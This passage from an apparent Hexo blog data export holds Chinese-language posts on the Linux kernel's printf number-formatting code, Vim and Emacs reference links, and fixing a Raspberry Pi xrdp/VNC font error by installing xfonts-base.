class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</div><div class=\"line\"></div><div class=\"line\">\t\t<span class=\"keyword\">default</span>:</div><div class=\"line\">\t\t\t*str++ = <span class=\"string\">'%'</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (*fmt)</div><div class=\"line\">\t\t\t\t*str++ = *fmt;</div><div class=\"line\">\t\t\t<span class=\"keyword\">else</span></div><div class=\"line\">\t\t\t\t--fmt;</div><div class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (qualifier == <span class=\"string\">'l'</span>)</div><div class=\"line\">\t\t\tnum = va_arg(args, <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span>);</div><div class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (qualifier == <span class=\"string\">'h'</span>) &#123;</div><div class=\"line\">\t\t\tnum = (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">short</span>)va_arg(args, <span class=\"keyword\">int</span>);</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (flags &amp; SIGN)</div><div class=\"line\">\t\t\t\tnum = (<span class=\"keyword\">short</span>)num;</div><div class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (flags &amp; SIGN)</div><div class=\"line\">\t\t\tnum = va_arg(args, <span class=\"keyword\">int</span>);</div><div class=\"line\">\t\t<span class=\"keyword\">else</span></div><div class=\"line\">\t\t\tnum = va_arg(args, <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>);</div><div class=\"line\">\t\tstr = number(str, num, base, field_width, precision, flags);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t*str = <span class=\"string\">'\\0'</span>;</div><div class=\"line\">\t<span class=\"keyword\">return</span> str - buf;</div></pre></td></tr></table></figure></p>\n<h2 id=\"number函数\"><a href=\"#number函数\" class=\"headerlink\" title=\"number函数\"></a>number函数</h2><p>首先分析一下这个宏定义的作用,如果先看number函数里面用到这个宏居然是放在<code>[]</code>里面的,因此可以猜测作用是用来偏移寻址的.有些人会问,C语言里面可以这样用吗?(答案很明了了,不能用怎么编译通过呢?所以还是需要多看别人写的代码,有些用法不常用的但是如果好用就可以Get到了)编译器编译的时候能够生成合适的代码即可.这个宏的作用是求出n对base余数,并使得n变为商,同时”返回”余数__res.主要用于八进制和十六进制的数值与字符的转换.(不知是否C语言的思想是一切皆为表达式,据说类*nix操作系统和shell的核心思想分别是<code>一切皆为文件</code>和<code>一切皆为表达式</code>.)<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __do_div(n, base) (&#123; \\</div><div class=\"line\">int __res; \\</div><div class=\"line\">__res = ((unsigned long) n) % (unsigned) base; \\</div><div class=\"line\">n = ((unsigned long) n) / (unsigned) base; \\</div><div class=\"line\">__res; &#125;)</span></div></pre></td></tr></table></figure></p>\n<p>再来看number函数的实现,首先分析函数的参数以及返回值,作为软件工程师应该要做到文档清晰可理解,各个接口的参数以及返回值的作用解释清楚.<code>static</code>类型的函数表明这个函数仅仅在这个文件作用域可以调用,这样减少了命名冲突问题.<code>char *</code>返回值表明能够实现链式功能,可对比<code>strcpy</code>函数的实现.再来看参数,第一个str即上层传入的str首地址,表明要对上层传进来的参数空间进行修改.第二个<code>num</code>是对%idp等格式化的栈参数的一个拷贝.第三个<code>base</code>顾名思义就是进制基数了.第四个<code>size</code>即为对齐宽度.第五个为精度,最后一个为标志位字段.<br>首先定义一个静态的常量数组保存进制转换的字符,便于直接寻址取得相应字符赋值给str.<code>tmp[66]</code>我认为目前来看是有点长,它的作用是暂存num转换之后的数据,num最大为<code>long</code>的最大值,为2^64(64bit),也就是16个F,即16个字符即可,愚以为有点多余~~~.locase探测type字段的SMALL标志,不得不说SMALL标志位也是取得合理,32-&gt;第4位置位,使得可以很轻松地<code>或</code>运算实现大写字符-&gt;小写字符(ascll码相差32).如果<code>0</code>和<code>-</code>同时置位,gcc编译器会提示<code>warning: &#39;0&#39; flag ignored with &#39;-&#39; flag in gnu_printf format [-Wformat=]</code>,表明会忽略掉<code>0</code>的作用,具体实现也是这样.首先会判断是否有左对齐标志,有的话就用经典的<code>&amp;= ~</code>运算来清除相应标志位,这个在嵌入式开发里面很常见,一般是操作外设寄存器用的.在这里的逻辑是清除<code>补零</code>标志.这里也有一个健壮性的判断,不过number函数仅限于本文件调用,一般的开发者应该不会传入错误的base.字符<code>c</code>也是用来填充的,为<code>0</code>或者空格.接下来就是检测SIGH标志,并根据正负和0填充的需求占据<code>size</code>和置位<code>sign</code>.之后判断16进制和8进制情况,16进制的<code>size</code>减2是由于要填充<code>0x</code>或者<code>0X</code>,8进制只需要填充<code>0</code>即可.之后就开始进制转换成字符了,并根据<code>locase</code>的实际情况对于16进制翻转大小写字符.而对于数字0~9,由于他们的ascll码的第4位已经置位,所以或上1并不影响自身的值,而默认的大写字母第4位没有置位,如果程序员需要转换就可以转换.这个是很巧妙的!!!值得学习的技巧.传进来的<code>precision</code>表示精度,由于这里没有浮点匹配,这里就主要用来截取串的长度.如果<code>ZEROPAD</code>和<code>LEFT</code>都没有置位,就填充空格.然后根据进制继续填充数值.如果不是左对齐,就根据<code>size</code>的剩余大小继续填充<code>c</code>,后面就根据i的情况填充了,直到满足<code>size</code>这个宽度域为0.最后返回<code>str</code>的首地址.<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">char</span> *<span class=\"title\">number</span><span class=\"params\">(<span class=\"keyword\">char</span> *str, <span class=\"keyword\">long</span> num, <span class=\"keyword\">int</span> base, <span class=\"keyword\">int</span> size, <span class=\"keyword\">int</span> precision,</div><div class=\"line\">\t\t    <span class=\"keyword\">int</span> type)</span></div><div class=\"line\"></span>&#123;</div><div class=\"line\">\t<span class=\"comment\">/* we are called with base 8, 10 or 16, only, thus don't need \"G...\"  */</span></div><div class=\"line\">\t<span class=\"keyword\">static</span> <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> digits[<span class=\"number\">16</span>] = <span class=\"string\">\"0123456789ABCDEF\"</span>; <span class=\"comment\">/* \"GHIJKLMNOPQRSTUVWXYZ\"; */</span></div><div class=\"line\"></div><div class=\"line\">\t<span class=\"keyword\">char</span> tmp[<span class=\"number\">66</span>];</div><div class=\"line\">\t<span class=\"keyword\">char</span> c, sign, locase;</div><div class=\"line\">\t<span class=\"keyword\">int</span> i;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* locase = 0 or 0x20. ORing digits or letters with 'locase'</div><div class=\"line\">\t * produces same digits or (maybe lowercased) letters */</span></div><div class=\"line\">\tlocase = (type &amp; SMALL);</div><div class=\"line\">\t<span class=\"keyword\">if</span> (type &amp; LEFT)</div><div class=\"line\">\t\ttype &amp;= ~ZEROPAD;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (base &lt; <span class=\"number\">2</span> || base &gt; <span class=\"number\">16</span>)</div><div class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</div><div class=\"line\">\tc = (type &amp; ZEROPAD) ? <span class=\"string\">'0'</span> : <span class=\"string\">' '</span>;</div><div class=\"line\">\tsign = <span class=\"number\">0</span>;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (type &amp; SIGN) &#123;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (num &lt; <span class=\"number\">0</span>) &#123;</div><div class=\"line\">\t\t\tsign = <span class=\"string\">'-'</span>;</div><div class=\"line\">\t\t\tnum = -num;</div><div class=\"line\">\t\t\tsize--;</div><div class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (type &amp; PLUS) &#123;</div><div class=\"line\">\t\t\tsign = <span class=\"string\">'+'</span>;</div><div class=\"line\">\t\t\tsize--;</div><div class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (type &amp; SPACE) &#123;</div><div class=\"line\">\t\t\tsign = <span class=\"string\">' '</span>;</div><div class=\"line\">\t\t\tsize--;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (type &amp; SPECIAL) &#123;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (base == <span class=\"number\">16</span>)</div><div class=\"line\">\t\t\tsize -= <span class=\"number\">2</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (base == <span class=\"number\">8</span>)</div><div class=\"line\">\t\t\tsize--;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\ti = <span class=\"number\">0</span>;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (num == <span class=\"number\">0</span>)</div><div class=\"line\">\t\ttmp[i++] = <span class=\"string\">'0'</span>;</div><div class=\"line\">\t<span class=\"keyword\">else</span></div><div class=\"line\">\t\t<span class=\"keyword\">while</span> (num != <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\ttmp[i++] = (digits[__do_div(num, base)] | locase);</div><div class=\"line\">\t<span class=\"keyword\">if</span> (i &gt; precision)</div><div class=\"line\">\t\tprecision = i;</div><div class=\"line\">\tsize -= precision;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (!(type &amp; (ZEROPAD + LEFT)))</div><div class=\"line\">\t\t<span class=\"keyword\">while</span> (size-- &gt; <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\t*str++ = <span class=\"string\">' '</span>;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (sign)</div><div class=\"line\">\t\t*str++ = sign;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (type &amp; SPECIAL) &#123;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (base == <span class=\"number\">8</span>)</div><div class=\"line\">\t\t\t*str++ = <span class=\"string\">'0'</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (base == <span class=\"number\">16</span>) &#123;</div><div class=\"line\">\t\t\t*str++ = <span class=\"string\">'0'</span>;</div><div class=\"line\">\t\t\t*str++ = (<span class=\"string\">'X'</span> | locase);</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (!(type &amp; LEFT))</div><div class=\"line\">\t\t<span class=\"keyword\">while</span> (size-- &gt; <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\t*str++ = c;</div><div class=\"line\">\t<span class=\"keyword\">while</span> (i &lt; precision--)</div><div class=\"line\">\t\t*str++ = <span class=\"string\">'0'</span>;</div><div class=\"line\">\t<span class=\"keyword\">while</span> (i-- &gt; <span class=\"number\">0</span>)</div><div class=\"line\">\t\t*str++ = tmp[i];</div><div class=\"line\">\t<span class=\"keyword\">while</span> (size-- &gt; <span class=\"number\">0</span>)</div><div class=\"line\">\t\t*str++ = <span class=\"string\">' '</span>;</div><div class=\"line\">\t<span class=\"keyword\">return</span> str;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<h2 id=\"puts\"><a href=\"#puts\" class=\"headerlink\" title=\"puts\"></a>puts</h2><p>至于puts的实现应该就不难了,内核中有很多处代码.应该就是简单地逐字节地拷贝到某缓冲区,再由内核的IO调度机制向屏幕或者串口等字符驱动设备文件拷贝输出.一般在嵌入式开发里面串口输出的比较常见.而普通PC的CPU(类似以前8086时代的intel)可能是按照主板等的设计给显存预留出地址空间,只要CPU把数据送往那个地址空间(貌似是0x0B800)显示设备就能够打印出相应的字符.</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>最起初的printf实现大概就这么多吧,可能内核开发者考虑到某些CPU没有浮点体系就没有把处理浮点类型的情况加进去的,标准的printf实现还是需要参考glibc库的.后期有空继续分析.对了,前面有说到<code>格式化字符串漏洞</code>参考看雪论坛这篇<a href=\"http://bbs.pediy.com/showthread.php?t=213153\">文章</a>,如果没注册看不了的话先<a href=\"http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458279936&amp;idx=1&amp;sn=2eb47265a0d170c45403d4b5d9097549&amp;chksm=b181508a86f6d99c27d4b2c9281a573ac16284c3a7f7f6f3d9cad3a7452f3bcc22ba15616303&amp;scene=0#wechat_redirect\">戳这里吧</a></p>\n"},{"title":"vim_and_emacs","date":"2016-08-23T06:20:59.000Z","_content":"\n\n> 在学习Linux的时候，最好从console开始，完全脱离窗体束缚，感受最原始的类DOS时代的`程序员使命感`,由于Linux下编辑器也是五花八门，不过最流行的莫过于Vim和Emacs，在这里附上它们的一些链接便于学习．\n\n参考资料：  \n[Vimdoc:http://vimdoc.sourceforge.net/](http://vimdoc.sourceforge.net/ \"Vimdoc\")\n[Vimnum:http://vimdoc.sourceforge.net/vimum.html](http://vimdoc.sourceforge.net/vimum.html)\n[caole_Vim:http://www.caole.net/diary/vim.html#sec-14](http://www.caole.net/diary/vim.html#sec-14)\n[caole_Vim_improved:http://dsec.pku.edu.cn/~jinlong/vi/Vi.html](http://dsec.pku.edu.cn/~jinlong/vi/Vi.html)\n[caole_Emacs:http://www.caole.net/diary/emacs_tips.html](http://www.caole.net/diary/emacs_tips.html)\n[https://github.com/yangyangwithgnu/use_vim_as_ide](https://github.com/yangyangwithgnu/use_vim_as_ide)\n\n\n","source":"_posts/vim-and-emacs.md","raw":"---\ntitle: vim_and_emacs\ndate: 2016-08-23 14:20:59\ntags:\n- Linux\ncategories: \n- study\n---\n\n\n> 在学习Linux的时候，最好从console开始，完全脱离窗体束缚，感受最原始的类DOS时代的`程序员使命感`,由于Linux下编辑器也是五花八门，不过最流行的莫过于Vim和Emacs，在这里附上它们的一些链接便于学习．\n\n参考资料：  \n[Vimdoc:http://vimdoc.sourceforge.net/](http://vimdoc.sourceforge.net/ \"Vimdoc\")\n[Vimnum:http://vimdoc.sourceforge.net/vimum.html](http://vimdoc.sourceforge.net/vimum.html)\n[caole_Vim:http://www.caole.net/diary/vim.html#sec-14](http://www.caole.net/diary/vim.html#sec-14)\n[caole_Vim_improved:http://dsec.pku.edu.cn/~jinlong/vi/Vi.html](http://dsec.pku.edu.cn/~jinlong/vi/Vi.html)\n[caole_Emacs:http://www.caole.net/diary/emacs_tips.html](http://www.caole.net/diary/emacs_tips.html)\n[https://github.com/yangyangwithgnu/use_vim_as_ide](https://github.com/yangyangwithgnu/use_vim_as_ide)\n\n\n","slug":"vim-and-emacs","published":1,"updated":"2016-11-14T02:56:11.086Z","_id":"civhnccwd000jg8uaws34ajk7","comments":1,"layout":"post","photos":[],"link":"","content":"<blockquote>\n<p>在学习Linux的时候，最好从console开始，完全脱离窗体束缚，感受最原始的类DOS时代的<code>程序员使命感</code>,由于Linux下编辑器也是五花八门，不过最流行的莫过于Vim和Emacs，在这里附上它们的一些链接便于学习．</p>\n</blockquote>\n<p>参考资料：<br><a href=\"http://vimdoc.sourceforge.net/\" title=\"Vimdoc\" target=\"_blank\" rel=\"external\">Vimdoc:http://vimdoc.sourceforge.net/</a><br><a href=\"http://vimdoc.sourceforge.net/vimum.html\" target=\"_blank\" rel=\"external\">Vimnum:http://vimdoc.sourceforge.net/vimum.html</a><br><a href=\"http://www.caole.net/diary/vim.html#sec-14\" target=\"_blank\" rel=\"external\">caole_Vim:http://www.caole.net/diary/vim.html#sec-14</a><br><a href=\"http://dsec.pku.edu.cn/~jinlong/vi/Vi.html\" target=\"_blank\" rel=\"external\">caole_Vim_improved:http://dsec.pku.edu.cn/~jinlong/vi/Vi.html</a><br><a href=\"http://www.caole.net/diary/emacs_tips.html\" target=\"_blank\" rel=\"external\">caole_Emacs:http://www.caole.net/diary/emacs_tips.html</a><br><a href=\"https://github.com/yangyangwithgnu/use_vim_as_ide\" target=\"_blank\" rel=\"external\">https://github.com/yangyangwithgnu/use_vim_as_ide</a></p>\n","excerpt":"","more":"<blockquote>\n<p>在学习Linux的时候，最好从console开始，完全脱离窗体束缚，感受最原始的类DOS时代的<code>程序员使命感</code>,由于Linux下编辑器也是五花八门，不过最流行的莫过于Vim和Emacs，在这里附上它们的一些链接便于学习．</p>\n</blockquote>\n<p>参考资料：<br><a href=\"http://vimdoc.sourceforge.net/\" title=\"Vimdoc\">Vimdoc:http://vimdoc.sourceforge.net/</a><br><a href=\"http://vimdoc.sourceforge.net/vimum.html\">Vimnum:http://vimdoc.sourceforge.net/vimum.html</a><br><a href=\"http://www.caole.net/diary/vim.html#sec-14\">caole_Vim:http://www.caole.net/diary/vim.html#sec-14</a><br><a href=\"http://dsec.pku.edu.cn/~jinlong/vi/Vi.html\">caole_Vim_improved:http://dsec.pku.edu.cn/~jinlong/vi/Vi.html</a><br><a href=\"http://www.caole.net/diary/emacs_tips.html\">caole_Emacs:http://www.caole.net/diary/emacs_tips.html</a><br><a href=\"https://github.com/yangyangwithgnu/use_vim_as_ide\">https://github.com/yangyangwithgnu/use_vim_as_ide</a></p>\n"},{"title":"raspberry pi xrdp error","date":"2016-11-07T02:35:42.000Z","_content":"\n参考资料:\n[http://askubuntu.com/questions/648819/couldnt-start-xtightvnc-trying-default-font-path-vncserver](http://askubuntu.com/questions/648819/couldnt-start-xtightvnc-trying-default-font-path-vncserver)\n\n> 关于树莓派的介绍以及使用可参考官方网站  \n\n\n# 单板Linux\n随着嵌入式Linux越来越流行,目前很多厂商都在致力于做单板主机,因此市面上也有很多产品可供选择.其中最具有活力的便是树莓派了,连在**Mr Robot**一剧中都被主人公拿来\"打广告\".其他诸如香蕉派,香橙派,菠萝派等等pi都有开发团队在开发和维护,有兴趣的可以逐个折腾或者吊的自己绘制PCB制作.\n\n# 访问方式\n毫无疑问Web是目前最流行的可视化途径,但是在Linux中最最适合的还是属于console.一般默认在刷入固件之后会默认开启sshd服务,此时便可以通过网络接口ssh连接工具访问树莓派.当然,如果没有开启或者没有通过扫描等方式获取到树莓派的IP地址,则可以借助显示设备或者默认的串口来查看信息,可供选择的是显示接口为HDMI和专用显示接口,一般我们会用HDMI转VGA转接口来接显示屏,此后配置好后便可以当小型服务器用了.\n\n# 配置远程桌面\n有些时候console解决不了的时候就必须启用rdp了.Linux中可供选择的桌面系统还是很多的,其中xfce作为流行的轻量级的桌面系统深受好评.一般我们仅仅需要开启xrdp服务即可采用微软的**mstsc**工具来连接Linux主机,但xrdp貌似也是在本地封装vnc服务,因此当vnc服务出现问题的时候即便3389端口处于监听状态也是没辙.无奈只好谷歌.报错信息如下:\n```bash\nosmc@osmc:~$ vncserver \nCouldn't start Xtightvnc; trying default font path.\nPlease set correct fontPath in the vncserver script.\nCouldn't start Xtightvnc process.\n\n07/11/16 01:04:29 Xvnc version TightVNC-1.3.9\n07/11/16 01:04:29 Copyright (C) 2000-2007 TightVNC Group\n07/11/16 01:04:29 Copyright (C) 1999 AT&T Laboratories Cambridge\n07/11/16 01:04:29 All Rights Reserved.\n07/11/16 01:04:29 See http://www.tightvnc.com/ for information on TightVNC\n07/11/16 01:04:29 Desktop name 'X' (osmc:1)\n07/11/16 01:04:29 Protocol versions supported: 3.3, 3.7, 3.8, 3.7t, 3.8t\n07/11/16 01:04:29 Listening for VNC connections on TCP port 5901\nFont directory '/usr/share/fonts/X11/misc/' not found - ignoring\nFont directory '/usr/share/fonts/X11/Type1/' not found - ignoring\nFont directory '/usr/share/fonts/X11/75dpi/' not found - ignoring\nFont directory '/usr/share/fonts/X11/100dpi/' not found - ignoring\n\nFatal server error:\ncould not open default font 'fixed'\n07/11/16 01:04:30 Xvnc version TightVNC-1.3.9\n07/11/16 01:04:30 Copyright (C) 2000-2007 TightVNC Group\n07/11/16 01:04:30 Copyright (C) 1999 AT&T Laboratories Cambridge\n07/11/16 01:04:30 All Rights Reserved.\n07/11/16 01:04:30 See http://www.tightvnc.com/ for information on TightVNC\n07/11/16 01:04:30 Desktop name 'X' (osmc:1)\n07/11/16 01:04:30 Protocol versions supported: 3.3, 3.7, 3.8, 3.7t, 3.8t\n07/11/16 01:04:30 Listening for VNC connections on TCP port 5901\nFont directory '/usr/share/fonts/X11/misc/' not found - ignoring\nFont directory '/usr/share/fonts/X11/Speedo/' not found - ignoring\nFont directory '/usr/share/fonts/X11/Type1/' not found - ignoring\nFont directory '/usr/share/fonts/X11/75dpi/' not found - ignoring\nFont directory '/usr/share/fonts/X11/100dpi/' not found - ignoring\n\nFatal server error:\ncould not open default font 'fixed'\n```\n找了好几个论坛之后又装了好多貌似多余的东西,最后发现仅仅需在[这里](http://askubuntu.com/questions/648819/couldnt-start-xtightvnc-trying-default-font-path-vncserver)键入`sudo apt-get install  xfonts-base`即可解决字体问题了.   \n\n\n```bash\nosmc@osmc:~$ sudo vncserver \n\nNew 'X' desktop is osmc:1\n\nCreating default startup script /root/.vnc/xstartup\nStarting applications specified in /root/.vnc/xstartup\nLog file is /root/.vnc/osmc:1.log\n\nosmc@osmc:~$ netstat -anot\nActive Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       Timer\ntcp        0      0 0.0.0.0:5901            0.0.0.0:*               LISTEN      off (0.00/0/0)\ntcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      off (0.00/0/0)\ntcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      off (0.00/0/0)\ntcp        0      0 0.0.0.0:6001            0.0.0.0:*               LISTEN      off (0.00/0/0)\ntcp        0      0 127.0.0.1:3350          0.0.0.0:*               LISTEN      off (0.00/0/0)\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)\ntcp        0      0 0.0.0.0:1177            0.0.0.0:*               LISTEN      off (0.00/0/0)\ntcp        0      0 0.0.0.0:36666           0.0.0.0:*               LISTEN      off (0.00/0/0)\ntcp        0      0 0.0.0.0:3389            0.0.0.0:*               LISTEN      off (0.00/0/0)\ntcp        0    180 192.168.31.132:22       10.129.95.50:33532      ESTABLISHED on (0.21/0/0)\ntcp6       0      0 :::111                  :::*                    LISTEN      off (0.00/0/0)\ntcp6       0      0 :::8080                 :::*                    LISTEN      off (0.00/0/0)\ntcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)\ntcp6       0      0 :::36666                :::*                    LISTEN      off (0.00/0/0)\ntcp6       0      0 :::36667                :::*                    LISTEN      off (0.00/0/0)\ntcp6       0      0 ::1:9090                :::*                    LISTEN      off (0.00/0/0)\n\n```\n可以看到服务已经开启了,5901端口处于监听状态.再次`mstsc`之后发现error没了,问题解决.\n# 总结\n遇到问题还是要有折腾的情怀,虽然还不知所以然,但是能够解决这个问题也不辜负**搬砖**的身份...为了不犯第二次错误,便记录下了本文.\n","source":"_posts/raspberry-pi-xrdp-error.md","raw":"---\ntitle: raspberry pi xrdp error\ndate: 2016-11-07 10:35:42\ncategories:\n- study\ntags:\n- Configure\n- Linux\n---\n\n参考资料:\n[http://askubuntu.com/questions/648819/couldnt-start-xtightvnc-trying-default-font-path-vncserver](http://askubuntu.com/questions/648819/couldnt-start-xtightvnc-trying-default-font-path-vncserver)\n\n> 关于树莓派的介绍以及使用可参考官方网站  \n\n\n# 单板Linux\n随着嵌入式Linux越来越流行,目前很多厂商都在致力于做单板主机,因此市面上也有很多产品可供选择.其中最具有活力的便是树莓派了,连在**Mr Robot**一剧中都被主人公拿来\"打广告\".其他诸如香蕉派,香橙派,菠萝派等等pi都有开发团队在开发和维护,有兴趣的可以逐个折腾或者吊的自己绘制PCB制作.\n\n# 访问方式\n毫无疑问Web是目前最流行的可视化途径,但是在Linux中最最适合的还是属于console.一般默认在刷入固件之后会默认开启sshd服务,此时便可以通过网络接口ssh连接工具访问树莓派.当然,如果没有开启或者没有通过扫描等方式获取到树莓派的IP地址,则可以借助显示设备或者默认的串口来查看信息,可供选择的是显示接口为HDMI和专用显示接口,一般我们会用HDMI转VGA转接口来接显示屏,此后配置好后便可以当小型服务器用了.\n\n# 配置远程桌面\n有些时候console解决不了的时候就必须启用rdp了.Linux中可供选择的桌面系统还是很多的,其中xfce作为流行的轻量级的桌面系统深受好评.一般我们仅仅需要开启xrdp服务即可采用微软的**mstsc**工具来连接Linux主机,但xrdp貌似也是在本地封装vnc服务,因此当vnc服务出现问题的时候即便3389端口处于监听状态也是没辙.无奈只好谷歌.报错信息如下:\n```bash\nosmc@osmc:~$ vncserver \nCouldn't start Xtightvnc; trying default font path.\nPlease set correct fontPath in the vncserver script.\nCouldn't start Xtightvnc process.\n\n07/11/16 01:04:29 Xvnc version TightVNC-1.3.9\n07/11/16 01:04:29 Copyright (C) 2000-2007 TightVNC Group\n07/11/16 01:04:29 Copyright (C) 1999 AT&T Laboratories Cambridge\n07/11/16 01:04:29 All Rights Reserved.\n07/11/16 01:04:29 See http://www.tightvnc.com/ for information on TightVNC\n07/11/16 01:04:29 Desktop name 'X' (osmc:1)\n07/11/16 01:04:29 Protocol versions supported: 3.3, 3.7, 3.8, 3.7t, 3.8t\n07/11/16 01:04:29 Listening for VNC connections on TCP port 5901\nFont directory '/usr/share/fonts/X11/misc/' not found - ignoring\nFont directory '/usr/share/fonts/X11/Type1/' not found - ignoring\nFont directory '/usr/share/fonts/X11/75dpi/' not found - ignoring\nFont directory '/usr/share/fonts/X11/100dpi/' not found - ignoring\n\nFatal server error:\ncould not open default font 'fixed'\n07/11/16 01:04:30 Xvnc version TightVNC-1.3.9\n07/11/16 01:04:30 Copyright (C) 2000-2007 TightVNC Group\n07/11/16 01:04:30 Copyright (C) 1999 AT&T Laboratories Cambridge\n07/11/16 01:04:30 All Rights Reserved.\n07/11/16 01:04:30 See http://www.tightvnc.com/ for information on TightVNC\n07/11/16 01:04:30 Desktop name 'X' (osmc:1)\n07/11/16 01:04:30 Protocol versions supported: 3.3, 3.7, 3.8, 3.7t, 3.8t\n07/11/16 01:04:30 Listening for VNC connections on TCP port 5901\nFont directory '/usr/share/fonts/X11/misc/' not found - ignoring\nFont directory '/usr/share/fonts/X11/Speedo/' not found - ignoring\nFont directory '/usr/share/fonts/X11/Type1/' not found - ignoring\nFont directory '/usr/share/fonts/X11/75dpi/' not found - ignoring\nFont directory '/usr/share/fonts/X11/100dpi/' not found - ignoring\n\nFatal server error:\ncould not open default font 'fixed'\n```\n找了好几个论坛之后又装了好多貌似多余的东西,最后发现仅仅需在[这里](http://askubuntu.com/questions/648819/couldnt-start-xtightvnc-trying-default-font-path-vncserver)键入`sudo apt-get install  xfonts-base`即可解决字体问题了.   \n\n\n```bash\nosmc@osmc:~$ sudo vncserver \n\nNew 'X' desktop is osmc:1\n\nCreating default startup script /root/.vnc/xstartup\nStarting applications specified in /root/.vnc/xstartup\nLog file is /root/.vnc/osmc:1.log\n\nosmc@osmc:~$ netstat -anot\nActive Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       Timer\ntcp        0      0 0.0.0.0:5901            0.0.0.0:*               LISTEN      off (0.00/0/0)\ntcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      off (0.00/0/0)\ntcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      off (0.00/0/0)\ntcp        0      0 0.0.0.0:6001            0.0.0.0:*               LISTEN      off (0.00/0/0)\ntcp        0      0 127.0.0.1:3350          0.0.0.0:*               LISTEN      off (0.00/0/0)\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)\ntcp        0      0 0.0.0.0:1177            0.0.0.0:*               LISTEN      off (0.00/0/0)\ntcp        0      0 0.0.0.0:36666           0.0.0.0:*               LISTEN      off (0.00/0/0)\ntcp        0      0 0.0.0.0:3389            0.0.0.0:*               LISTEN      off (0.00/0/0)\ntcp        0    180 192.168.31.132:22       10.129.95.50:33532      ESTABLISHED on (0.21/0/0)\ntcp6       0      0 :::111                  